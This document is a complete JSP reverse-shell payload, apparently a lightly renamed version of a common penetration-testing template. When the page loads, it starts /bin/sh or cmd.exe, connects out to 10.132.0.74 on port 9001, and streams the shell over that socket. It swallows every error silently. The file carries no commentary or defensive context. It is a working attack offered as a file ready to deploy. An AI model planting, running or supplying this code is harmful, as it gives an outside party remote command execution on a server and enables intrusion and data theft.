<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream e9;
    OutputStream sZ;

    StreamConnector( InputStream e9, OutputStream sZ )
    {
      this.e9 = e9;
      this.sZ = sZ;
    }

    public void run()
    {
      BufferedReader b6  = null;
      BufferedWriter kvL = null;
      try
      {
        b6  = new BufferedReader( new InputStreamReader( this.e9 ) );
        kvL = new BufferedWriter( new OutputStreamWriter( this.sZ ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = b6.read( buffer, 0, buffer.length ) ) > 0 )
        {
          kvL.write( buffer, 0, length );
          kvL.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( b6 != null )
          b6.close();
        if( kvL != null )
          kvL.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.132.0.74", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
